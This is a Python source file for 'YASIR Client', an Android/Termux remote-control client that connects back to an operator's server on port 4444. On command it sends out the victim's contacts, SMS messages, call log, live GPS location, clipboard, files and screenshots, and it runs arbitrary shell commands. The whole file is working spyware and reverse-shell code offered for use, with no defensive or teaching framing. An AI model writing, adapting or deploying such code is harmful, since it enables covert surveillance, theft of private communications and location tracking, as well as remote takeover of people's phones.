#!/usr/bin/env python3
# YASIR Client - Full Android Info & Control
import socket, subprocess, os, sys, time, json

SRV = '127.0.0.1'  # CHANGE THIS
PRT = 4444
DIR = os.getcwd()

def sh(c, t=15):
    try:
        r = subprocess.check_output(c, shell=True, stderr=subprocess.STDOUT, timeout=t)
        return r.decode('utf-8', errors='replace')
    except: return "[-] Failed"

def sep(t):
    return f"\n{'='*45}\n[{t}]\n{'='*45}\n"

def get_info():
    info = f"""
{sep('DEVICE INFO')}
Model     : {sh('getprop ro.product.model').strip()}
Name      : {sh('getprop ro.product.name').strip()}
Android   : {sh('getprop ro.build.version.release').strip()}
SDK       : {sh('getprop ro.build.version.sdk').strip()}
Patch     : {sh('getprop ro.build.version.security_patch').strip()}
Build     : {sh('getprop ro.build.display.id').strip()}
Board     : {sh('getprop ro.product.board').strip()}
Device    : {sh('getprop ro.product.device').strip()}
Hardware  : {sh('getprop ro.hardware').strip()}
Manufac   : {sh('getprop ro.product.manufacturer').strip()}
Serial    : {sh('getprop ro.serialno').strip()}
Fingerprint: {sh('getprop ro.build.fingerprint').strip()[:60]}
Radio     : {sh('getprop ro.build.radio').strip()}
Bootloader: {sh('getprop ro.boot.bootloader').strip()}

{sep('NETWORK')}
Operator  : {sh('getprop gsm.operator.alpha').strip()}
Country   : {sh('getprop gsm.operator.iso-country').strip()}
Network   : {sh('getprop gsm.operator.numeric').strip()}
IP        : {sh('ifconfig wlan0 | grep inet').strip() or sh('ip addr show wlan0 | grep inet').strip()}
MAC       : {sh('cat /sys/class/net/wlan0/address').strip()}
DNS       : {sh('getprop net.dns1').strip()}

{sep('HARDWARE')}
CPU       : {sh("cat /proc/cpuinfo | grep 'Processor'").strip() or sh("cat /proc/cpuinfo | grep 'Hardware'").strip()}
CPU Cores : {sh('nproc').strip()}
RAM Total : {sh("cat /proc/meminfo | grep MemTotal").strip()}
RAM Free  : {sh("cat /proc/meminfo | grep MemFree").strip()}
Arch      : {os.uname().machine}
Kernel    : {os.uname().release}

{sep('STORAGE')}
Internal  : {sh('df -h /data | tail -1').strip()}
SDCard    : {sh('df -h /sdcard | tail -1').strip()}
System    : {sh('df -h /system | tail -1').strip()}

{sep('BATTERY')}
{sh('termux-battery-status 2>/dev/null || dumpsys battery 2>/dev/null | grep -E "level|status|temperature|voltage"').strip()}

{sep('USER')}
User      : {os.getenv('USER') or os.getenv('LOGNAME') or 'unknown'}
Hostname  : {socket.gethostname()}
Python    : {sys.version.split()[0]}
CWD       : {DIR}
Uptime    : {sh('uptime').strip()}
"""
    return info

def get_contacts():
    r = sh("termux-contact-list 2>/dev/null")
    try:
        data = json.loads(r)
        out = f"\n{'='*45}\nCONTACTS ({len(data)})\n{'='*45}\n"
        for i, c in enumerate(data, 1):
            name = c.get('name', '?')
            num = c.get('number', '?')
            out += f"  {i:3}. {name[:25]:25} {num}\n"
        return out
    except:
        return f"[-] Contacts error: {r[:100]}"

def get_sms():
    r = sh("termux-sms-inbox 2>/dev/null")
    try:
        data = json.loads(r)
        out = f"\n{'='*45}\nSMS INBOX ({len(data)})\n{'='*45}\n"
        for i, s in enumerate(data[:40], 1):
            num = s.get('number', '?')
            body = s.get('body', '')[:80]
            date = s.get('received', '')
            out += f"  {i:3}. {num[:20]:20} {date}\n      {body}\n"
        return out
    except:
        return f"[-] SMS error: {r[:100]}"

def get_calls():
    r = sh("termux-call-log 2>/dev/null")
    try:
        data = json.loads(r)
        out = f"\n{'='*45}\nCALL LOG ({len(data)})\n{'='*45}\n"
        for i, c in enumerate(data[:40], 1):
            num = c.get('number', '?')
            dur = c.get('duration', '0')
            date = c.get('date', '')
            typ = c.get('type', '?')
            out += f"  {i:3}. {num[:20]:20} {dur:>5}s {date}\n"
        return out
    except:
        return f"[-] Calls error: {r[:100]}"

def get_apps():
    r = sh("pm list packages 2>/dev/null")
    if r.startswith("[-]"): return r
    apps = r.replace("package:", "").split()
    out = f"\n{'='*45}\nALL APPS ({len(apps)})\n{'='*45}\n"
    
    # Separate system and user apps
    user = sh("pm list packages -3 2>/dev/null").replace("package:", "").split()
    
    out += f"\n[USER APPS - {len(user)}]\n"
    for i, a in enumerate(user[:30], 1):
        out += f"  {i:3}. {a}\n"
    if len(user) > 30:
        out += f"  ... and {len(user)-30} more\n"
    
    out += f"\n[SYSTEM APPS - {len(apps)-len(user)}]\n"
    sys_apps = [a for a in apps if a not in user]
    for i, a in enumerate(sys_apps[:20], 1):
        out += f"  {i:3}. {a}\n"
    
    return out

def get_location():
    r = sh("termux-location 2>/dev/null")
    try:
        data = json.loads(r)
        lat = data.get('latitude', 'N/A')
        lon = data.get('longitude', 'N/A')
        acc = data.get('accuracy', 'N/A')
        alt = data.get('altitude', 'N/A')
        spd = data.get('speed', 'N/A')
        prov = data.get('provider', 'N/A')
        maps = f"https://www.google.com/maps?q={lat},{lon}"
        
        out = f"""
{'='*45}
LIVE LOCATION
{'='*45}
Latitude  : {lat}
Longitude : {lon}
Accuracy  : {acc}m
Altitude  : {alt}m
Speed     : {spd}m/s
Provider  : {prov}
Time      : {time.strftime('%Y-%m-%d %H:%M:%S')}

[Open in Maps]
{maps}
"""
        return out
    except:
        return f"[-] Location error: {r[:200]}"

def get_network():
    out = f"\n{'='*45}\nNETWORK INFO\n{'='*45}\n"
    out += f"IP       : {sh('ifconfig wlan0 | grep inet').strip()}\n"
    out += f"MAC      : {sh('cat /sys/class/net/wlan0/address').strip()}\n"
    out += f"Gateway  : {sh('ip route | grep default').strip()}\n"
    out += f"DNS      : {sh('getprop net.dns1').strip()}\n"
    out += f"Operator : {sh('getprop gsm.operator.alpha').strip()}\n"
    
    # WiFi scan
    wifi = sh("termux-wifi-scaninfo 2>/dev/null")
    try:
        data = json.loads(wifi)
        out += f"\n[WiFi Networks - {len(data)}]\n"
        for w in data[:10]:
            ssid = w.get('ssid', '?')
            bssid = w.get('bssid', '?')
            rssi = w.get('rssi', '0')
            out += f"  {ssid[:25]:25} {bssid:20} {rssi}dBm\n"
    except:
        out += f"\n[WiFi Scan]\n{wifi[:200]}\n"
    
    return out

def get_battery():
    r = sh("termux-battery-status 2>/dev/null")
    try:
        data = json.loads(r)
        out = f"\n{'='*45}\nBATTERY\n{'='*45}\n"
        out += f"Level      : {data.get('percentage', '?')}%\n"
        out += f"Status     : {data.get('status', '?')}\n"
        out += f"Plugged    : {data.get('plugged', '?')}\n"
        out += f"Health     : {data.get('health', '?')}\n"
        out += f"Temp       : {data.get('temperature', '?')}°C\n"
        out += f"Voltage    : {data.get('voltage', '?')}mV\n"
        out += f"Current    : {data.get('current', '?')}mA\n"
        return out
    except:
        return f"\n[-] Battery error"

def get_storage():
    out = f"\n{'='*45}\nSTORAGE\n{'='*45}\n"
    out += sh("df -h /sdcard /data /system 2>/dev/null")
    out += f"\n[Memory]\n"
    out += sh("free -h 2>/dev/null || cat /proc/meminfo | grep -E 'MemTotal|MemFree|MemAvailable'")
    return out

def get_process():
    out = f"\n{'='*45}\nTOP PROCESSES (by memory)\n{'='*45}\n"
    out += sh("ps aux --sort=-%mem 2>/dev/null | head -25 || ps -eo pid,%mem,comm --sort=-%mem | head -25 || ps | head -25")
    return out

def get_clip():
    r = sh("termux-clipboard-get 2>/dev/null")
    out = f"\n{'='*45}\nCLIPBOARD\n{'='*45}\n{r if r.strip() else '[Empty]'}\n"
    return out

def client():
    while True:
        try:
            s = socket.socket()
            s.settimeout(10)
            s.connect((SRV, PRT))
            s.settimeout(None)
            
            while True:
                try:
                    cmd = s.recv(65536).decode().strip()
                except:
                    break
                
                if not cmd: continue
                if cmd == 'exit': s.close(); return
                
                resp = ""
                
                if cmd == 'info':
                    resp = get_info()
                elif cmd == 'contacts':
                    resp = get_contacts()
                elif cmd == 'sms':
                    resp = get_sms()
                elif cmd == 'calls':
                    resp = get_calls()
                elif cmd == 'apps':
                    resp = get_apps()
                elif cmd == 'location':
                    resp = get_location()
                elif cmd == 'network':
                    resp = get_network()
                elif cmd == 'battery':
                    resp = get_battery()
                elif cmd == 'storage':
                    resp = get_storage()
                elif cmd == 'process':
                    resp = get_process()
                elif cmd == 'clipboard':
                    resp = get_clip()
                elif cmd.startswith('shell '):
                    resp = sh(cmd[6:], 20)
                    if not resp.strip(): resp = "[Done]"
                elif cmd.startswith('toast '):
                    sh(f'termux-toast "{cmd[6:]}" 2>/dev/null')
                    resp = "[+] Notification sent"
                elif cmd.startswith('download '):
                    fname = cmd[9:]
                    try:
                        with open(fname, 'r') as f:
                            resp = f.read()[:50000]
                    except Exception as e:
                        resp = f"[-] {e}"
                elif cmd == 'screenshot':
                    sh("termux-screenshot /sdcard/yrs_ss.jpg 2>/dev/null")
                    try:
                        import base64
                        with open('/sdcard/yrs_ss.jpg', 'rb') as f:
                            data = base64.b64encode(f.read()).decode()
                        resp = f"[PHOTO]{data[:60000]}"
                    except:
                        resp = "[-] Screenshot failed"
                else:
                    resp = f"[-] Unknown: {cmd}"
                
                try:
                    s.send(resp.encode()[:60000])
                except:
                    break
            
            s.close()
            
        except KeyboardInterrupt:
            sys.exit(0)
        except:
            time.sleep(5)

if __name__ == '__main__':
    client()
